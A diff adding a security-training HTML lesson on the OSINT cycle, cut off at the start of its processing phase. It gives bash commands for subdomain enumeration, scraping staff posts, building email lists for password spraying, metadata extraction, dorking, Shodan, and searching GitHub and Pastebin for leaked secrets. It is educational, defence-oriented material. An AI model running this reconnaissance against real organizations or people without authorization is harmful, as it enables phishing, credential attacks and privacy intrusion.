@@ -1,0 +1,2739 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>The OSINT Cycle | ISCSECURITY Master Class Series</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="/css/styles.css?v=2026_PRODUCTION_FINAL" />
+</head>
+
+<body class="page-lesson">
+
+<div class="site-topbar" role="note" aria-label="Legal notice">
+  <small class="topbar-note">
+    © 2026 ISCSECURITY · Authorization-first training. All testing must be lawful, scoped, and approved in writing.
+  </small>
+	<nav class="topbar-links" aria-label="Topbar links">
+      <a href="https://iscsecurity.org/index">Home</a>
+      <a href="https://iscsecurity.org/content/index">Content</a>
+	  <a href="https://iscsecurity.org/content/2-open-source-intelligence/index">OSINT</a>
+      <a href="https://iscsecurity.org/contact">Contact</a>
+    </nav>
+</div>
+
+  <main class="page modules-page" id="main-content">   <!-- No data-ms-content -->
+  <article class="lesson-content overlay" tabindex="0" aria-label="Lesson content: The OSINT Cycle">
+
+    <p class="breadcrumb">
+      <a href="https://iscsecurity.org/index">Home</a> →
+        <a href="https://iscsecurity.org/content/index">Content</a> →
+        <a href="https://iscsecurity.org/content/1-ethical-hacking/2-open-source-intelligence/index">OSINT</a>
+      <span aria-current="page">Page 2</span>
+    </p>
+
+    <h1>The OSINT Cycle</h1>
+
+    <div class="reminder-auth">
+  <strong>🚨 AUTHORIZED USE ONLY:</strong>
+  <span>
+        All content in this document is for educational and defensive training purposes only. 
+        The adversarial techniques described are derived from real-world tradecraft but 
+        are documented exclusively for <strong>defensive analysis, detection engineering, 
+        and authorized security testing</strong>. Unauthorized deployment of any technique 
+        described may constitute a criminal offense under applicable national and 
+        international cybercrime laws. Always obtain <strong>explicit written authorization</strong> 
+        from the system owner or authorized legal entity before testing, executing, or 
+        simulating any of the techniques outlined in this document.
+    </span>
+	</div>
+
+    <div class="reminder-comp">
+  <strong>🌍 INTERNATIONAL COMPLIANCE NOTICE:</strong>
+  <span>
+    Cybercrime laws vary significantly by jurisdiction. It is your sole responsibility 
+    to understand and comply with the laws applicable to your location, the location 
+    of any target systems, and your organization's policies. When in doubt, 
+    <strong>consult a qualified legal professional</strong> before testing, executing, 
+    or simulating any technique described in this document.
+  </span>
+</div>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: OSINT CYCLE OVERVIEW                                 -->
+    <!-- ============================================================ -->
+
+    <section class="module-section" id="osint-cycle">
+      <h2>The OSINT Cycle: From Idea to Action</h2>
+
+      <div class="info-remember">
+        <strong>Estimated Time for This Module:</strong> ~2 hours
+      </div>
+
+      <p>
+        Open Source Intelligence is not a search engine query. It is a formal intelligence discipline 
+        governed by a repeatable workflow, the <strong>OSINT Cycle</strong>. Adapted from traditional 
+        intelligence community (IC) doctrine, this cycle transforms unstructured public data into 
+        decision-grade intelligence by enforcing rigor at every stage. Without the cycle, operators 
+        default to <em>collection bias</em>: amassing vast quantities of data that may be timely, 
+        irrelevant, or inadmissible, while missing the single pivot that breaks a target's attack surface.
+      </p>
+
+      <h3>Why Structure Matters</h3>
+      
+	  <p>
+        In ad-hoc reconnaissance, an analyst scrapes a target domain, dumps the results into a text file, 
+        and attempts to retroactively justify why the data matters. The OSINT Cycle reverses this. 
+        It forces you to define <em>what you need to know</em> before you touch a keyboard, and it mandates 
+        validation before any finding is packaged for action. This structure serves three operational imperatives:
+      </p>
+      
+	  <ul>
+        <li>
+          <strong>Relevance:</strong> Every collection task must map to a <em>Key Intelligence Question (KIQ)</em>. 
+          If a query does not answer a defined requirement, it is scope creep and a potential attribution risk.
+        </li>
+        <li>
+          <strong>Traceability:</strong> Each phase generates artifacts, source URLs, timestamps, confidence ratings, 
+          and analyst notes, that create an audit trail. For blue teams, this is evidence integrity; 
+          for red teams, it is scope justification if findings are challenged.
+        </li>
+        <li>
+          <strong>Velocity:</strong> A constrained cycle accelerates decision-making. Knowing when to stop collecting 
+          and start analyzing prevents the diminishing returns of "just one more source."
+        </li>
+      </ul>
+
+      <h3>The Five Phases: An Operational Breakdown</h3>
+      <p>
+        The cycle is often drawn as a circle, but in practice it is a <em>spiral</em>. Dissemination does not end the 
+        process; it feeds new requirements back into planning. The phases are not checkboxes. They are gates 
+        where raw material is refined, contradictions are resolved, and intelligence failures are caught 
+        before they become operational failures.
+      </p>
+	  </section>
+      <!-- ============================================================ -->
+      <!-- PHASE 1: PLANNING                                             -->
+      <!-- ============================================================ -->
+
+      <section aria-labelledby="osint-planning">
+        <h2 id="osint-planning">1. Planning</h2>
+
+        <div class="info-remember">
+          <strong>Estimated Time:</strong> 10–15 minutes
+        </div>
+
+        <p>
+          <strong>Definition:</strong> Convert a vague idea ("do OSINT on this target")
+          into clear <strong>intelligence requirements</strong>, constraints, and success
+          criteria.
+        </p>
+
+        <h3>Key Activities</h3>
+        <ul>
+          <li>Define which questions OSINT must answer (e.g. staff exposure, cloud footprint, leaked data).</li>
+          <li>Clarify scope, time window, and authorised targets with stakeholders.</li>
+          <li>Identify legal, contractual, and ethical boundaries in writing.</li>
+          <li>Choose an initial toolset and storage location for collected data.</li>
+        </ul>
+
+        <h3>Examples</h3>
+        <ul>
+          <li>A security team is tasked with mapping all public references to a new product and its backend stack.</li>
+          <li>A Red Team needs a people-focused picture of the finance department to design a realistic phishing scenario.</li>
+          <li>A SOC lead wants to know whether any internal admin accounts appear in public breach datasets.</li>
+        </ul>
+
+        <!-- Common Mistakes -->
+        <div class="reminder">
+          <strong>Common Mistakes:</strong>
+          <ul>
+            <li>Collecting everything without a clear <strong>Key Intelligence Question (KIQ)</strong>.</li>
+            <li>Forgetting to record <strong>timestamps</strong> and sources.</li>
+            <li>Treating CT log entries as <strong>live hosts</strong> without verification.</li>
+            <li>Assuming every document author is a <strong>current employee</strong>.</li>
+            <li>Ignoring <strong>false positives</strong> and confirmation bias.</li>
+          </ul>
+        </div>
+
+        <!-- Practical Example: Enumerating Subdomains -->
+        <h3>Practical Example: Enumerating Subdomains via Certificate Transparency Logs</h3>
+
+        <p>
+          <strong>Scenario:</strong> During authorized reconnaissance of <code>target.com</code>, 
+          you need to discover subdomains without sending traffic to the target's nameservers.
+        </p>
+
+        <h4>Step 1: Query Certificate Transparency (CT) Logs via crt.sh</h4>
+
+<pre><code class="language-bash"># Retrieve all certificates for *.target.com from public CT logs
+$ curl -s "https://crt.sh/?q=%.target.com&output=json" | \
+  jq -r '.[].name_value' | \
+  sort -u | \
+  tee ct_subdomains.txt
+
+# Expected output:
+# www.target.com
+# mail.target.com
+# dev.target.com
+# staging.target.com
+# vpn.target.com
+# *.cdn.target.com
+</code></pre>
+
+        <h4>Step 2: Passive Enumeration with Subfinder</h4>
+
+<pre><code class="language-bash"># Aggregate passive sources (archive, crt.sh, bufferover, etc.)
+$ subfinder -d target.com -all -o subfinder_passive.txt
+
+# Validate which discovered hosts resolve (only if authorized / in-scope)
+$ dnsx -l subfinder_passive.txt -resp -o resolved_subdomains.txt
+</code></pre>
+
+        <!-- Dead End -->
+        <div class="reminder">
+          <strong>Dead End Encountered:</strong><br>
+          <strong>Subfinder:</strong> Found nothing, zero results returned.<br>
+          <strong>↓</strong><br>
+          <strong>Amass:</strong> Still nothing, no passive sources yielded results.<br>
+          <strong>↓</strong><br>
+          <strong>CT Logs (crt.sh):</strong> Success, discovered 14 subdomains.<br>
+          <strong>Lesson:</strong> When one source fails, pivot. CT logs are often more reliable than DNS-based enumeration for heavily protected domains.
+        </div>
+
+        <h4>Step 3: Deep Enumeration with Amass (Passive Mode)</h4>
+
+        <pre><code class="language-bash"># Amass passive enumeration against multiple data sources
+$ amass enum -passive -d target.com -o amass_passive.txt
+
+# Convert output to a clean list
+$ cat amass_passive.txt | cut -d']' -f1 | sort -u | tee final_subdomains.txt
+</code></pre>
+
+        <h4>Step 4: Cross-Reference and Filter Wildcards</h4>
+
+<pre><code class="language-bash"># Remove wildcard noise (e.g., *.cdn.target.com) and deduplicate
+$ cat ct_subdomains.txt subfinder_passive.txt amass_passive.txt | \
+  grep -v "^\*" | \
+  sort -u | \
+  tee validated_subdomains.txt
+
+# Optional: Identify which subdomains have unique ASNs or hosting providers
+$ for sub in $(cat validated_subdomains.txt); do \
+    echo -n "$sub: "; \
+    dig +short $sub | head -n1; \
+  done | tee subdomain_ips.txt
+</code></pre>
+
+        <!-- Operator Notes -->
+        <div class="reminder">
+          <strong>Operator Notes:</strong><br>
+          CT logs revealed 42 subdomains.<br>
+          Only 19 resolved.<br>
+          Three pointed to CDN infrastructure.<br>
+          Two appeared abandoned.<br>
+          One became the primary pivot for further reconnaissance.
+        </div>
+
+        <div class="info-remember">
+          <strong>Defensive Takeaway:</strong> Wildcard certificates (e.g., <code>*.target.com</code>) 
+          often hide forgotten subdomains in SAN fields. Blue Teams should regularly audit their own 
+          CT log entries using the same queries to identify shadow IT or decommissioned hosts still 
+          pointing to infrastructure.
+        </div>
+
+        <!-- Confidence Ratings -->
+        <h4>Confidence Ratings</h4>
+        <div class="iscsec-table-responsive">
+          <table class="iscsec-table" aria-label="Confidence Ratings">
+            <thead>
+              <tr>
+                <th>Finding</th>
+                <th>Confidence</th>
+                <th>Basis</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>Subdomain discovery</td>
+                <td>High</td>
+                <td>Verified across multiple CT logs</td>
+              </tr>
+              <tr>
+                <td>Employee role (Jane Smith)</td>
+                <td>Medium</td>
+                <td>Single source (LinkedIn profile)</td>
+              </tr>
+              <tr>
+                <td>Technology stack</td>
+                <td>Medium</td>
+                <td>Inferred from HTTP headers (can be spoofed)</td>
+              </tr>
+              <tr>
+                <td>Email naming convention</td>
+                <td>High</td>
+                <td>Confirmed across 3 independent sources</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <!-- Practical Example: Corporate Hashtag Scraping -->
+        <h3>Practical Example: Scraping Corporate Hashtags for Staff &amp; Technology Leakage</h3>
+
+        <p>
+          <strong>Scenario:</strong> The target organization uses <code>#TechCorpLife</code> on 
+          public social platforms. You need to map employees, identify technologies in use, and 
+          detect partner relationships without authenticating to the platforms.
+        </p>
+
+        <h4>Step 1: Twitter / X Public Scraping with snscrape</h4>
+
+<pre><code class="language-bash"># Install: pip install snscrape
+# Collect tweets containing the corporate hashtag (last 500 public posts)
+$ snscrape --jsonl --max-results 500 twitter-hashtag TechCorpLife > techcorplife_tweets.jsonl
+
+# Extract usernames, dates, and tweet text for manual review
+$ cat techcorplife_tweets.jsonl | \
+  jq -r '"\(.user.username)|\(.date)|\(.content)"' | \
+  tee hashtag_extract.csv
+
+# Grep for technology keywords (case-insensitive)
+$ cat techcorplife_tweets.jsonl | \
+  jq -r '.content' | \
+  grep -iE "(salesforce|servicenow|aws|azure|jira|confluence|office365|vpn)" | \
+  tee technologies_mentioned.txt
+</code></pre>
+
+        <!-- Operator Notes -->
+        <div class="reminder">
+          <strong>Operator Notes:</strong><br>
+          Scraped 500 tweets.<br>
+          Identified 32 employees across 4 departments.<br>
+          Found 7 mentions of AWS and 4 mentions of Office365.<br>
+          One tweet contained a screenshot exposing an internal IP address.
+        </div>
+
+        <h4>Step 2: LinkedIn Public Profile Pivot (Manual + Automated)</h4>
+
+<pre><code class="language-bash"># Use linkedin2username to generate a probable username list from employee names
+# First, harvest names from public hashtag posts (manual step), then:
+$ linkedin2username.py -n "john.doe,jane.smith,alex.jones" -d techcorp.com -o employees_usernames.txt
+
+# Verify email format patterns for password spraying preparation (authorized only)
+$ cat employees_usernames.txt | sed 's/$/@techcorp.com/' > probable_emails.txt
+</code></pre>
+
+        <h4>Step 3: Image &amp; Geolocation Extraction from Public Posts</h4>
+
+<pre><code class="language-bash"># Download images from scraped JSON metadata (if URLs present)
+$ cat techcorplife_tweets.jsonl | \
+  jq -r '.media[]? | select(.type=="photo") | .url' | \
+  wget -i - -P ./hashtag_images/
+
+# Extract EXIF metadata from downloaded images
+$ exiftool ./hashtag_images/ | grep -iE "(gps|latitude|longitude|camera|software|author)" | tee image_metadata.txt
+
+# Extract location tags from post metadata
+$ cat techcorplife_tweets.jsonl | \
+  jq -r '.place.fullName // empty' | \
+  sort | uniq -c | sort -nr | tee location_leaks.txt
+</code></pre>
+
+        <h4>Step 4: Partner &amp; Vendor Identification via Mention Analysis</h4>
+
+<pre><code class="language-bash"># Extract @mentions to identify business relationships
+$ cat techcorplife_tweets.jsonl | \
+  jq -r '.content' | \
+  grep -oE "@[A-Za-z0-9_]+" | \
+  sort | uniq -c | sort -nr | tee partner_mentions.txt
+
+# Extract URLs to find shared documentation portals, event pages, or SaaS links
+$ cat techcorplife_tweets.jsonl | \
+  jq -r '.content' | \
+  grep -oE "https?://[^ ]+" | \
+  sort -u | tee shared_urls.txt
+</code></pre>
+
+        <div class="info-remember">
+          <strong>Defensive Takeaway:</strong> Employee advocacy hashtags are high-yield OSINT sources. 
+          Security teams should monitor their own branded hashtags regularly, enforce geolocation 
+          tagging policies, and remind staff not to photograph screen contents, access badges, or 
+          internal URLs.
+        </div>
+
+        <!-- Practical Example: Document Metadata Extraction -->
+        <h3>Practical Example: Document Metadata Extraction</h3>
+
+        <p>
+          <strong>Scenario:</strong> You have identified publicly indexed PDFs and Office documents 
+          on <code>target.com</code> via search-engine dorking. You need to extract authorship, 
+          software versions, and internal paths without interacting with the target's web applications.
+        </p>
+
+        <h4>Step 1: Discover Public Documents via Google Dorking</h4>
+
+<pre><code class="language-bash"># Identify publicly indexed documents (run from a passive / non-attributable session)
+# Note: These queries are executed against the search engine, not the target directly.
+
+# PDF files on target domain
+$ curl -s "https://www.google.com/search?q=site:target.com+filetype:pdf&num=50" | \
+  grep -oE "https?://[^&]+\.pdf" | \
+  sort -u | tee pdf_urls.txt
+
+# Microsoft Office documents
+$ curl -s "https://www.google.com/search?q=site:target.com+(filetype:doc+OR+filetype:docx+OR+filetype:xlsx)&num=50" | \
+  grep -oE "https?://[^&]+\.(doc|docx|xlsx)" | \
+  sort -u | tee office_urls.txt
+
+# Alternative: Use theHarvester to find documents via Bing API
+$ theHarvester -d target.com -b bing -n -t | grep -iE "\.(pdf|doc|docx|xlsx|ppt)" | tee docs_found.txt
+</code></pre>
+
+        <!-- Dead End -->
+        <div class="reminder">
+          <strong>Dead End Encountered:</strong><br>
+          <strong>Google Dorks (site:target.com filetype:pdf "password"):</strong> No results returned.<br>
+          <strong>↓</strong><br>
+          <strong>Try alternative operators:</strong> <code>site:target.com filetype:pdf "confidential"</code><br>
+          <strong>Result:</strong> Found 3 documents containing internal meeting notes.<br>
+          <strong>Lesson:</strong> Don't give up after the first failed dork, adjust search terms and try again.
+        </div>
+
+        <h4>Step 2: Download Documents Safely</h4>
+
+<pre><code class="language-bash"># Download identified documents via curl (no browser fingerprinting, isolated IP/VPN recommended)
+$ mkdir -p ./target_docs && cd ./target_docs
+
+$ for url in $(cat ../pdf_urls.txt); do
+    filename=$(basename "$url" | cut -d'?' -f1)
+    curl -sL -o "$filename" "$url"
+    sleep $((RANDOM % 5 + 3))  # Jitter to avoid rate limits
+  done
+
+# Verify file types (defense against disguised executables)
+$ file * | tee file_types.txt
+</code></pre>
+
+        <h4>Step 3: Extract Metadata with ExifTool</h4>
+
+<pre><code class="language-bash"># Recursive metadata extraction across all downloaded documents
+$ exiftool -r ./target_docs/ | tee full_metadata.txt
+
+# Extract specific intelligence fields
+$ exiftool -r -a -u -g1 ./target_docs/ | grep -iE \
+  "(Author|Creator|Company|Software|Template|LastModifiedBy|Producer|Title|Subject|Keywords|CreateDate|ModifyDate|GPS|Internal|Printer)" | \
+  tee intelligence_metadata.txt
+
+# PDF-specific metadata with pdfinfo
+$ for pdf in ./target_docs/*.pdf; do
+    echo "===== $pdf ====="
+    pdfinfo "$pdf"
+  done | tee pdfinfo_metadata.txt
+</code></pre>
+
+        <!-- Operator Notes -->
+        <div class="reminder">
+          <strong>Operator Notes:</strong><br>
+          Document metadata revealed 3 distinct authors and 2 software versions.<br>
+          One document contained an internal network path to <code>FILESERVER01</code>.<br>
+          This path was validated across 3 documents, increasing confidence that <code>FILESERVER01</code> is still active.<br>
+          The template path was present only in older documents (pre-2022), suggesting a recent migration.
+        </div>
+
+        <h4>Step 4: Parse for Operational Intelligence</h4>
+
+<pre><code class="language-bash"># Identify usernames from Author / LastModifiedBy fields
+$ cat full_metadata.txt | grep -iE "(Author|LastModifiedBy)" | sort | uniq -c | sort -nr | tee document_authors.txt
+
+# Identify software versions (e.g., Microsoft Word 2013, Adobe Acrobat XI) for exploit targeting
+$ cat full_metadata.txt | grep -i "Software" | sort | uniq -c | sort -nr | tee software_versions.txt
+
+# Extract embedded internal network paths or shared drive references from document content
+$ for doc in ./target_docs/*; do
+    strings "$doc" | grep -iE "\\\\\\\\[A-Z0-9]+\\|/mnt/|/home/|file://|C:\\\\Users\\\\" | tee -a internal_paths.txt
+  done
+</code></pre>
+
+        <h4>Step 5: Sample Metadata Output</h4>
+
+<pre><code class="language-text">Author                          : jdoe
+Creator Tool                    : Microsoft Word 15.0 (Office 2013)
+Company                         : TechCorp Internal Operations
+Last Modified By                : admin_svc
+Software                        : Adobe PDF Library 15.0
+Producer                        : Acrobat Distiller 15.0
+Create Date                     : 2023:08:14 09:23:00
+Modify Date                     : 2024:01:10 14:55:00
+Template                        : \\FILESERVER01\Templates\Corporate_Letter.dotx
+</code></pre>
+
+        <div class="info-remember">
+          <strong>Defensive Takeaway:</strong> Documents exported from internal networks frequently 
+          retain metadata containing AD usernames, internal server names, and software versions. 
+          Organizations should institute metadata sanitization policies (e.g., 
+          <code>ExifTool -all=</code> or built-in Office "Inspect Document" features) before 
+          publishing files to public-facing web servers.
+        </div>
+
+        <div class="reminder">
+          <strong>Common Mistakes in Planning:</strong>
+          <ul>
+            <li>Not defining a clear <strong>Key Intelligence Question (KIQ)</strong> before starting.</li>
+            <li>Using only one tool for subdomain enumeration and assuming the results are complete.</li>
+            <li>Treating every CT log entry as a <strong>live host</strong> without verification.</li>
+            <li>Assuming every document author is a <strong>current employee</strong> without cross-referencing.</li>
+            <li>Ignoring <strong>false positives</strong> and confirmation bias.</li>
+          </ul>
+        </div>
+
+        <div class="reminder-lightblue">
+          <strong>Remember:</strong> Planning is not bureaucracy. It is where you decide what <strong>not</strong>
+          to collect. Clear requirements reduce noise, scope creep, and legal risk.
+        </div>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- PHASE 2: COLLECTION                                           -->
+      <!-- ============================================================ -->
+
+      <section aria-labelledby="osint-collection">
+        <h2 id="osint-collection">2. Collection</h2>
+
+        <div class="info-remember" style="margin: 15px 0;">
+          <strong>Estimated Time:</strong> 30–45 minutes
+        </div>
+
+        <p>
+          <strong>Definition:</strong> Gather raw data from approved, openly available
+          sources using a mix of manual and automated methods.
+        </p>
+
+        <h3>Typical Sources</h3>
+        <ul>
+          <li>Search engines (Google, Bing, Yandex and advanced-search operators).</li>
+          <li>Social platforms (LinkedIn, X/Twitter, GitHub, technical forums).</li>
+          <li>Public records (WHOIS, company registries, government open data portals).</li>
+          <li>Specialised search engines (Shodan, Censys, ZoomEye for exposed services).</li>
+          <li>News sites, blogs, paste sites, and (where authorised) dark web sources.</li>
+        </ul>
+
+        <h3>Practical OSINT Collection Examples</h3>
+
+        <!-- Example 1: Search Engines (Google Dorks) -->
+        <div class="card">
+          <h4>Search Engines (Google Dorks)</h4>
+          
+		  <p>
+		  <strong>Goal:</strong> Find exposed configuration files or sensitive documents.
+		  </p>
+		</div>
+
+<pre><code class="language-bash"># Google dork to find password references in PDFs on target domain
+$ echo "site:target.com filetype:pdf \"password\""
+</code></pre>
+          
+		  <p><strong>Expected Output:</strong></p>
+          
+<pre><code class="language-text">[+] Searching Google for PDFs containing 'password'...
+[+] Result: https://target.com/docs/manual_v2.pdf (Exposed)
+</code></pre>
+
+          <div class="info-remember">
+            <strong>Explanation:</strong> Using advanced operators. <code>site:</code> limits results to the target domain, 
+            <code>filetype:pdf</code> looks for PDFs, and quotes ensure exact phrase matching. This is often faster than 
+            scanning entire websites.
+          </div>
+
+          <div class="reminder">
+            <strong>Operator Notes:</strong><br>
+            The PDF contained internal documentation.<br>
+            The file was indexed by Google but not linked from the main site.<br>
+            This suggests it was accidentally exposed and not intentionally published.
+          </div>
+
+        <!-- Example 2: Social Platforms (GitHub) -->
+        <div class="card">
+  <h4>Social Platforms (GitHub)</h4>
+  
+  <p>
+  <strong>Goal:</strong> Identify tech stack and exposed repositories.
+  </p>
+
+<pre><code class="language-bash"># Search public GitHub repositories for target domain code
+$ ghsearch --org TargetCorp --lang Python | head -n 5
+</code></pre>
+  
+  <p>
+  <strong>Expected Output:</strong>
+  </p>
+  
+<pre><code class="language-text">[+] Found Repo: target-api-service (Python, FastAPI)
+[+] Found Repo: internal-tools (Go, Kubernetes Configs)
+</code></pre>
+
+  <div class="info-remember" style="display: block; clear: both; width: 100%; box-sizing: border-box;">
+  <strong>Explanation:</strong> Using the GitHub CLI tool, we search for public repositories owned by the organization. 
+  This reveals what technologies they use (e.g., Python, Go) and potentially exposed config files or API keys in 
+  public repos.
+</div>
+
+<div class="reminder" style="display: block; clear: both; width: 100%; box-sizing: border-box;">
+  <strong>Operator Notes:</strong><br>
+  The Kubernetes configs appear to be from a development environment.<br>
+  No production secrets were found in this repository.<br>
+  However, the repository structure suggests an internal tool that was accidentally made public.
+</div>
+
+<div class="reminder-lightblue" style="display: block; clear: both; width: 100%; box-sizing: border-box;">
+  <strong>Important:</strong> The examples showing exposed secrets or credentials are <strong>possible 
+  findings</strong>, not guaranteed outcomes. In real operations, you may not find exposed credentials. 
+  If you don't find anything, document that as a finding and pivot to other collection vectors.
+</div>
+</div>
+        
+		<!-- Example 3: Public Records (WHOIS) -->
+        <div class="card">
+          <h4>Public Records (WHOIS)</h4>
+          
+		  <p>
+		  <strong>Goal:</strong> Find related domains and registrant information.
+		  </p>
+
+<pre><code class="language-bash"># Query WHOIS and filter for registrant and DNS details
+$ whois target.com | grep -E "Registrant|Name Server"
+</code></pre>
+          
+		  <p>
+		  <strong>Expected Output:</strong>
+		  </p>
+
+<pre><code class="language-text">Registrant Name: John Doe (Privacy Protected)
+Registrant Email: j.doe@registrar.com
+Name Server: ns1.target-cloud.net
+Name Server: ns2.target-cloud.net
+</code></pre>
+
+<div class="info-remember">
+<strong>Explanation:</strong> <code>whois</code> gives registration details. Filtering for "Name Server" reveals the 
+DNS provider. If they use a specific registrar, you can search that registrar's database for other domains registered 
+by the same entity.
+</div>
+</div>
+
+        <!-- Example 4: Specialized Search Engines (Shodan) -->
+        <div class="card">
+          <h4>Specialized Search Engines (Shodan)</h4>
+          
+		  <p>
+		  <strong>Goal:</strong> Find open ports and services not advertised on the main site.
+		  </p>
+
+<pre><code class="language-bash"># Query Shodan for all IPs belonging to the target organization
+$ shodan search org:"TargetCorp" --fields ip_str,port,hostnames | head -n 10
+</code></pre>
+
+          <p>
+		  <strong>Expected Output (Fictional Documentation Range):</strong>
+		  </p>
+
+<pre><code class="language-text">IP Address       Port   Hostname
+203.0.113.14     22     ssh.internal.target.com
+203.0.113.22     80     web.target.com
+203.0.113.45     3306   db-legacy.target.com (MySQL)
+</code></pre>
+
+          <div class="info-remember">
+            <strong>Explanation:</strong> Shodan scans the entire internet. Filtering by the organization's name finds all their 
+            exposed IPs. Notice port <code>3306</code> (MySQL) is exposed, this is a common vulnerability if not firewalled 
+            properly.
+          </div>
+
+          <div class="reminder">
+            <strong>Operator Notes:</strong><br>
+            The IP addresses shown are from the <strong>RFC 5737 documentation range</strong> (203.0.113.0/24) and are fictional.<br>
+            In real operations, exposed databases are a critical finding.<br>
+            Some services appeared to be staging or development environments.
+          </div>
+        </div>
+
+        <!-- Example 5: Metadata Extraction -->
+        <div class="card">
+          <h4>Metadata Extraction</h4>
+          
+		  <p>
+		  <strong>Goal:</strong> Extract intelligence from publicly available documents (PDFs, Word, Excel, etc.)
+		  </p>
+
+          <h4>Step 1: Download Target Documents</h4>
+
+<pre><code class="language-bash"># Create workspace and download documents (authorized testing only)
+$ mkdir -p target_docs && cd target_docs
+
+# Download publicly available PDFs from target site (example)
+$ wget -r -l 1 -A .pdf,.docx,.xlsx https://target.com/docs/
+</code></pre>
+
+          <h4>Step 2: Recursive Metadata Extraction</h4>
+
+<pre><code class="language-bash"># Recursive metadata extraction across all downloaded documents
+$ exiftool -r ./target_docs/ | tee full_metadata.txt
+
+# Extract specific intelligence fields
+$ exiftool -r -a -u -g1 ./target_docs/ | grep -iE \
+  "(Author|Creator|Company|Software|Template|LastModifiedBy|Producer|Title|Subject|Keywords|CreateDate|ModifyDate|GPS|Internal|Printer)" | \
+  tee intelligence_metadata.txt
+
+# PDF-specific metadata with pdfinfo
+$ for pdf in ./target_docs/*.pdf; do
+    echo "===== $pdf ====="
+    pdfinfo "$pdf"
+  done | tee pdfinfo_metadata.txt
+</code></pre>
+
+          <h4>Step 3: Parse for Operational Intelligence</h4>
+
+<pre><code class="language-bash"># Identify usernames from Author / LastModifiedBy fields
+$ cat full_metadata.txt | grep -iE "(Author|LastModifiedBy)" | sort | uniq -c | sort -nr | tee document_authors.txt
+
+# Identify software versions (e.g., Microsoft Word 2013, Adobe Acrobat XI) for exploit targeting
+$ cat full_metadata.txt | grep -i "Software" | sort | uniq -c | sort -nr | tee software_versions.txt
+
+# Extract embedded internal network paths or shared drive references from document content
+$ for doc in ./target_docs/*; do
+    strings "$doc" | grep -iE "\\\\\\\\[A-Z0-9]+\\|/mnt/|/home/|file://|C:\\\\Users\\\\" | tee -a internal_paths.txt
+  done
+  </code></pre>
+
+          <h4>Step 4: Sample Metadata Output</h4>
+
+<pre><code class="language-text">Author                          : jdoe
+Creator Tool                    : Microsoft Word 15.0 (Office 2013)
+Company                         : TechCorp Internal Operations
+Last Modified By                : admin_svc
+Software                        : Adobe PDF Library 15.0
+Producer                        : Acrobat Distiller 15.0
+Create Date                     : 2023:08:14 09:23:00
+Modify Date                     : 2024:01:10 14:55:00
+Template                        : \\FILESERVER01\Templates\Corporate_Letter.dotx
+</code></pre>
+
+          <div class="reminder">
+            <strong>Adversary Use:</strong>
+            <ul>
+              <li>Author/LastModifiedBy fields reveal <strong>usernames</strong> for password spraying.</li>
+              <li>Software versions identify <strong>vulnerable applications</strong> (e.g., Office 2013 has known CVEs).</li>
+              <li>Template paths expose <strong>internal network infrastructure</strong> (e.g., FILESERVER01).</li>
+              <li>Create/Modify dates show document creation cycles and potentially internal processes.</li>
+            </ul>
+          </div>
+        </div>
+
+        <!-- Example 6: Paste Sites & GitHub Secrets -->
+        <div class="card">
+          <h4>Paste Sites &amp; GitHub Secrets</h4>
+          
+		  <p>
+		  <strong>Goal:</strong> Find leaked credentials, API keys, or sensitive data in public repositories and paste sites.
+		  </p>
+
+<pre><code class="language-bash"># Search GitHub for exposed secrets
+$ curl -s "https://api.github.com/search/code?q=target.com+password" | grep "html_url"
+
+# Search Pastebin for target-related content
+$ curl -s "https://pastebin.com/archive" | grep -i "target"
+</code></pre>
+
+          <p>
+		  <strong>Expected Output:</strong>
+		  </p>
+
+<pre><code class="language-text">[+] https://github.com/user123/repo/blob/main/config.env
+[+] https://pastebin.com/raw/xyz123 (Contains API Keys)
+</code></pre>
+
+          <div class="info-remember">
+            <strong>Explanation:</strong> Querying GitHub's code search API for the target domain + "password" finds public repos 
+            where developers might have accidentally committed secrets. Similarly, scanning paste sites can reveal credentials 
+            or configuration files.
+          </div>
+
+          <div class="reminder">
+            <strong>Operator Notes:</strong><br>
+            The config.env file contained placeholder values only.<br>
+            However, the file structure revealed the naming convention for environment variables.<br>
+            This could be used to guess production variable names in other contexts.
+          </div>
+
+          <div class="reminder-lightblue">
+            <strong>Important:</strong> The examples showing exposed secrets are <strong>possible findings</strong>, not 
+			guaranteed outcomes. If you search and find nothing, document that finding and pivot to other collection 
+			vectors.
+          </div>
+		  </div>
+
+        <!-- Confidence Ratings -->
+        <h4>Confidence Ratings</h4>
+        <div class="iscsec-table-responsive">
+          <table class="iscsec-table" aria-label="Collection Confidence Ratings">
+            <thead>
+              <tr>
+                <th>Finding</th>
+                <th>Confidence</th>
+                <th>Basis</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>Public email format</td>
+                <td>High</td>
+                <td>Confirmed across 3 independent sources</td>
+              </tr>
+              <tr>
+                <td>Employee role</td>
+                <td>Medium</td>
+                <td>Single source (LinkedIn profile)</td>
+              </tr>
+              <tr>
+                <td>Technology stack</td>
+                <td>Low</td>
+                <td>Only visible in HTTP headers (can be spoofed)</td>
+              </tr>
+              <tr>
+                <td>Possible VPN endpoint</td>
+                <td>Medium</td>
+                <td>Found in Shodan and CT logs</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="info-remember">
+          <strong>Collection should follow the plan.</strong> If you find yourself <strong>"clicking randomly,"</strong>
+          pause and update your requirements instead of hoarding more data. Document every query, source, and timestamp for 
+          auditability.
+        </div>
+
+        <div class="reminder">
+          <strong>Common Mistakes in Collection:</strong>
+          <ul>
+            <li>Starting collection without a <strong>clear collection plan</strong>.</li>
+            <li>Using only one tool and assuming the results are complete.</li>
+            <li>Not <strong>documenting queries</strong> and timestamps.</li>
+            <li>Interacting with targets without <strong>authorization</strong>.</li>
+            <li>Treating every finding as a <strong>guaranteed outcome</strong>.</li>
+          </ul>
+        </div>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- PHASE 3: PROCESSING & EXPLOITATION                            -->
+      <!-- ============================================================ -->
+
+      <section aria-labelledby="osint-processing">
+        <h2 id="osint-processing">3. Processing &amp; Exploitation</h2>
+
+        <div class="info-remember" style="margin: 15px 0;">
+          <strong>Estimated Time:</strong> 20–30 minutes
+        </div>
+
+        <p>
+          <strong>Definition:</strong> Turn raw, messy data into structured information.
